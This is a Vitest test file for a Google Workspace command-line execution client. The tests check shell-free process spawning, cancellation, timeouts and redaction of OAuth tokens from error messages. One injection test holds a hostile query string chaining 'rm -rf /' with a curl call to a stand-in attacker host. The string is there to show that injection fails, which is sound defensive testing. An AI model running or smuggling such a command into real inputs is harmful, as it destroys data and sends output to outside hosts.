import { describe, expect, it, vi } from "vitest";
import type * as childProcess from "node:child_process";
import { executeGws, GoogleApiError } from "@/lib/google/client";
import { EventEmitter } from "node:events";

describe("Google Workspace Execution Client Safety", () => {
  interface FakeProcessHandle {
    child: childProcess.ChildProcess;
    stdout: EventEmitter;
    stderr: EventEmitter;
    kill: ReturnType<typeof vi.fn>;
  }

  function createFakeProcess(): FakeProcessHandle {
    const emitter = new EventEmitter();
    const stdout = new EventEmitter();
    const stderr = new EventEmitter();
    const kill = vi.fn();

    const child = Object.assign(emitter, {
      stdout: stdout as unknown as childProcess.ChildProcess["stdout"],
      stderr: stderr as unknown as childProcess.ChildProcess["stderr"],
      kill,
    }) as unknown as childProcess.ChildProcess;

    return { child, stdout, stderr, kill };
  }

  it("spawns process with shell: false and argument array", async () => {
    const { child, stdout } = createFakeProcess();
    const spawnFn = vi.fn().mockReturnValue(child);

    const promise = executeGws(
      ["gmail", "users", "messages", "list", "--params", "{\"userId\":\"me\"}"],
      { spawnFn: spawnFn as unknown as typeof childProcess.spawn }
    );

    expect(spawnFn).toHaveBeenCalledTimes(1);
    const [, args, options] = spawnFn.mock.calls[0];

    expect(options.shell).toBe(false);
    expect(Array.isArray(args)).toBe(true);
    expect(args).toEqual(["gmail", "users", "messages", "list", "--params", "{\"userId\":\"me\"}"]);

    // Complete the child
    stdout.emit("data", Buffer.from("{\"messages\":[]}"));
    child.emit("close", 0);

    const output = await promise;
    expect(output).toBe("{\"messages\":[]}");
  });

  it("ensures malicious user input cannot inject shell operators", async () => {
    const { child, stdout } = createFakeProcess();
    const spawnFn = vi.fn().mockReturnValue(child);

    const maliciousQuery = "foo; rm -rf /; echo 'owned' | curl http://attacker.com";
    const promise = executeGws(
      ["gmail", "users", "messages", "list", "--params", JSON.stringify({ q: maliciousQuery })],
      { spawnFn: spawnFn as unknown as typeof childProcess.spawn }
    );

    const [, args, options] = spawnFn.mock.calls[0];
    expect(options.shell).toBe(false);
    // Arguments are array elements, not concatenated shell string
    expect(args[args.length - 1]).toContain(maliciousQuery);

    stdout.emit("data", Buffer.from("{}"));
    child.emit("close", 0);
    await promise;
  });

  it("handles cancellation via AbortSignal cleanly", async () => {
    const { child, kill } = createFakeProcess();
    const spawnFn = vi.fn().mockReturnValue(child);

    const controller = new AbortController();
    const promise = executeGws(["gmail", "list"], {
      signal: controller.signal,
      spawnFn: spawnFn as unknown as typeof childProcess.spawn,
    });

    controller.abort();

    await expect(promise).rejects.toThrow(GoogleApiError);
    await expect(promise).rejects.toMatchObject({ code: "cancelled" });
    expect(kill).toHaveBeenCalled();
  });

  it("handles execution timeout cleanly", async () => {
    const { child, kill } = createFakeProcess();
    const spawnFn = vi.fn().mockReturnValue(child);

    const promise = executeGws(["calendar", "list"], {
      timeoutMs: 50,
      spawnFn: spawnFn as unknown as typeof childProcess.spawn,
    });

    await expect(promise).rejects.toThrow(GoogleApiError);
    await expect(promise).rejects.toMatchObject({ code: "timeout" });
    expect(kill).toHaveBeenCalled();
  });

  it("sanitizes unauthenticated errors without leaking raw secrets or paths", async () => {
    const { child, stderr } = createFakeProcess();
    const spawnFn = vi.fn().mockReturnValue(child);

    const promise = executeGws(["drive", "list"], {
      spawnFn: spawnFn as unknown as typeof childProcess.spawn,
    });

    stderr.emit(
      "data",
      Buffer.from("Error: unauthenticated. OAuth token ya29.a0AfH6_SECRET expired.")
    );
    child.emit("close", 1);

    await expect(promise).rejects.toThrow(GoogleApiError);
    await expect(promise).rejects.toMatchObject({ code: "unauthenticated" });

    try {
      await promise;
    } catch (err: unknown) {
      const msg = (err as Error).message;
      expect(msg).not.toContain("ya29.");
      expect(msg).not.toContain("SECRET");
    }
  });
});
